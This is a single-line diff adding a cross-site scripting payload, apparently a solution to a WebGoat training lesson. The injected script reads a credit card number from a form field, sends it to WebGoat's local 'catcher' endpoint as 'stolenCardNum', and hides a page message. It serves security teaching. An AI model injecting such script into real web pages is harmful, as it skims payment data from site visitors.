@@ -1,0 +1,1 @@
+" <script> var ccNum = document.getElementsByName("input1")[0].value; window.open("http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolenCardNum=" + ccNum); document.getElementById("message").style.display = 'none'; </script>
